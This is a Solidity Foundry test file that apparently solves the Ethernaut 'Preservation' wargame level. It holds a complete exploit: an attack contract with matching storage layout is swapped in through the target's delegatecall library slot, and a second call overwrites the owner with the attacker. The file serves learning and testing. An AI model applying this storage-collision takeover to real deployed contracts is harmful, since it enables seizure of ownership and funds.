// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/16_Preservation.sol";

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address owner;
    
    function setTime(uint256 _time) public {
        owner=address(uint160(_time));
    }
}

contract PreservationTest is Test {
    Preservation _preservation;
    address deployer;
    address attacker;

    function setUp() public {
        deployer = address(this);
        attacker = vm.addr(1);

        address timeZone1LibraryAddress = address(new LibraryContract());
        address timeZone2LibraryAddress = address(new LibraryContract());

        _preservation = new Preservation(timeZone1LibraryAddress, timeZone2LibraryAddress);
    }

    function testSolution() public {
        vm.startPrank(attacker);

        PreservationAttack _preservationAttack = new PreservationAttack();

        _preservation.setFirstTime(uint256(uint160(address(_preservationAttack))));

        _preservation.setFirstTime(uint256(uint160(attacker)));

        assertEq(_preservation.owner(), attacker, "Attacker is not the owner!");
    }
}
